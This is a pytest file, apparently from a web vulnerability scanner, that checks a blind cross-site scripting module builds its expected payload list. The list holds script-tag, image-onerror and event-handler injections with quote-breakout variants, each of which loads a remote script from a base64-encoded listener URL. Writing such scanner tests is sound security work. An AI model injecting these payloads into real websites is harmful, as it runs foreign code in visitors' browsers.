import pytest
from ava.blinds.xss import CrossSiteScriptingBlindCheck


class TestCrossSiteScriptingBlindCheck:
    payloads = [
        '<img src="http://localhost:8080/">',
        '"><img src="http://localhost:8080/"><"',
        '<script src="http://localhost:8080/"></script>',
        '"><script src="http://localhost:8080/"></script><"',
        '<script>{}</script>',
        '"><script>{}</script><"',
        '<img src="x:#" onerror="{}">',
        '"><img src="x:#" onerror="{}"><"',
        '" onmouseover="{}',
        '#" onclick="{}',
        'javascript:(function(){{{}}})()',
        "';{}//'",
        '";{}//"'
    ]

    @pytest.fixture
    def check(self):
        listener = "http://localhost:8080/"
        return CrossSiteScriptingBlindCheck(listener)

    def test_init(self, check):
        encoded = "aHR0cDovL2xvY2FsaG9zdDo4MDgwLw=="
        script = "s=document.createElement('script');s.src=atob('{}');document.head.appendChild(s);".format(encoded)

        # init
        generated = [payload.format(script) for payload in self.payloads]
        test = check._payloads
        assert test == generated
